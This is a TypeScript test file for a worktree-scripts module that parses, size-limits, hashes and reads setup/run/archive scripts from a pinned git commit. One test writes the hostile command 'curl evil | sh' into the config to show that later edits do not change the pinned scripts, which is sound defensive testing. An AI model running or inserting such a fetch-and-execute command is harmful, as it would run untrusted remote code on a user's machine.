import { afterEach, describe, expect, it } from 'vitest'
import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, realpathSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { removeTempDir } from '../../lib/test-temp'
import { commitWorktree, ensureWorktree, headSha, planWorktree } from '../../core/workbench/worktree-workspaces'
import { parseScriptsConfig, pinnedScriptSha, readPinnedScripts, repoKeyOf, SCRIPT_MAX_BYTES, SCRIPTS_FILE_MAX_BYTES, scriptsHash } from './worktree-scripts'

const dirs: string[] = []
afterEach(() => { for (const d of dirs.splice(0)) removeTempDir(d) })
const PID = 'p-0123456789abcdef0123'
const cfg = (scripts: Record<string, unknown>) => JSON.stringify({ scripts })
function repo(files: Record<string, string> = {}) {
  const root = realpathSync.native(mkdtempSync(join(tmpdir(), 'cc-wt-scripts-'))); dirs.push(root)
  const project = join(root, 'repo'), state = join(root, 'state')
  mkdirSync(project); mkdirSync(state)
  const g = (...a: string[]) => execFileSync('git', a, { cwd: project, stdio: 'pipe' })
  g('init', '-q', '-b', 'main'); g('config', 'user.email', 't@t'); g('config', 'user.name', 't')
  writeFileSync(join(project, 'a.txt'), 'one\n')
  for (const [name, text] of Object.entries(files)) writeFileSync(join(project, name), text)
  g('add', '-A'); g('commit', '-q', '-m', 'init')
  return { project, state }
}

describe('parseScriptsConfig', () => {
  it('reads the three scripts, ignores unknown keys, blank ⇒ null', () => {
    expect(parseScriptsConfig(JSON.stringify({ other: 1, scripts: { setup: 'bun install', run: 'bun dev', archive: '  ', extra: 'x' } })))
      .toEqual({ config: { setup: 'bun install', run: 'bun dev', archive: null } })
    expect(parseScriptsConfig('{}')).toEqual({ config: { setup: null, run: null, archive: null } })
  })
  it('malformed ⇒ null + reason', () => {
    expect(parseScriptsConfig('not json')).toEqual({ config: null, reason: 'invalid_json' })
    expect(parseScriptsConfig('[1]')).toEqual({ config: null, reason: 'not_object' })
    expect(parseScriptsConfig(JSON.stringify({ scripts: 'x' }))).toEqual({ config: null, reason: 'scripts_not_object' })
    expect(parseScriptsConfig(cfg({ run: 3 }))).toEqual({ config: null, reason: 'run_not_string' })
  })
  it('size limits: each script ≤4KB, file ≤64KB', () => {
    expect(parseScriptsConfig(cfg({ setup: 'x'.repeat(SCRIPT_MAX_BYTES) })).config?.setup).toHaveLength(SCRIPT_MAX_BYTES)
    expect(parseScriptsConfig(cfg({ setup: 'x'.repeat(SCRIPT_MAX_BYTES + 1) }))).toEqual({ config: null, reason: 'setup_too_large' })
    // 按字节算:中文三字节一个
    expect(parseScriptsConfig(cfg({ archive: '中'.repeat(1400) }))).toEqual({ config: null, reason: 'archive_too_large' })
    expect(parseScriptsConfig(JSON.stringify({ pad: 'x'.repeat(SCRIPTS_FILE_MAX_BYTES), scripts: {} }))).toEqual({ config: null, reason: 'file_too_large' })
  })
  it('hash is canonical: key order in the file does not matter, content does', () => {
    const a = parseScriptsConfig('{"scripts":{"run":"r","setup":"s"}}').config!
    const b = parseScriptsConfig('{"scripts":{"setup":"s","run":"r","archive":""}}').config!
    expect(scriptsHash(a)).toBe(scriptsHash(b))
    expect(scriptsHash(a)).toMatch(/^[0-9a-f]{64}$/)
    expect(scriptsHash({ ...a, run: 'r2' })).not.toBe(scriptsHash(a))
  })
})

describe('readPinnedScripts', () => {
  it('reads from the pinned commit — working-tree edits and later commits on the branch do not change it', () => {
    const { project, state } = repo({ 'tendhearth.json': cfg({ setup: 'echo setup', run: 'echo run' }) })
    const plan = planWorktree({ stateDir: state, projectId: PID, projectPath: project, repoRoot: project, id: 'abcd1234' })
    ensureWorktree(plan)
    const sha = pinnedScriptSha(plan.root)!
    expect(sha).toBe(headSha(plan.root))
    const before = readPinnedScripts(project, sha)
    expect(before).toMatchObject({ kind: 'ok', config: { setup: 'echo setup', run: 'echo run', archive: null } })
    // 执行者在工作区里改了文件,再提交到分支上
    writeFileSync(join(plan.root, 'tendhearth.json'), cfg({ setup: 'curl evil | sh' }))
    expect(readPinnedScripts(project, sha)).toEqual(before)
    const later = commitWorktree(plan.root, 'change scripts')
    expect(later.sha).not.toBe(sha)
    expect(readPinnedScripts(project, sha)).toEqual(before)
    expect(readPinnedScripts(project, later.sha)).toMatchObject({ kind: 'ok', config: { setup: 'curl evil | sh' } })
  })
  it('no file ⇒ none; broken file ⇒ invalid; bad / unknown sha ⇒ invalid', () => {
    const { project } = repo()
    expect(readPinnedScripts(project, headSha(project))).toEqual({ kind: 'none' })
    const broken = repo({ 'tendhearth.json': '{oops' })
    expect(readPinnedScripts(broken.project, headSha(broken.project))).toEqual({ kind: 'invalid', reason: 'invalid_json' })
    expect(readPinnedScripts(project, 'HEAD')).toEqual({ kind: 'invalid', reason: 'invalid_sha' })
    expect(readPinnedScripts(project, '0'.repeat(40))).toEqual({ kind: 'invalid', reason: 'commit_missing' })
  })
  it('oversized file in the commit ⇒ invalid without parsing', () => {
    const { project } = repo({ 'tendhearth.json': JSON.stringify({ pad: 'x'.repeat(SCRIPTS_FILE_MAX_BYTES), scripts: {} }) })
    expect(readPinnedScripts(project, headSha(project))).toEqual({ kind: 'invalid', reason: 'file_too_large' })
  })
  it('pinnedScriptSha ⇒ null outside a repo (never throws)', () => {
    const dir = realpathSync.native(mkdtempSync(join(tmpdir(), 'cc-wt-scripts-nogit-'))); dirs.push(dir)
    expect(pinnedScriptSha(dir)).toBeNull()
    expect(pinnedScriptSha(join(dir, 'missing'))).toBeNull()
  })
  it('repoKeyOf resolves the real path (lowercased on win32)', () => {
    const { project } = repo()
    const key = repoKeyOf(join(project, '.'))
    expect(key).toBe(process.platform === 'win32' ? project.toLowerCase() : project)
  })
})
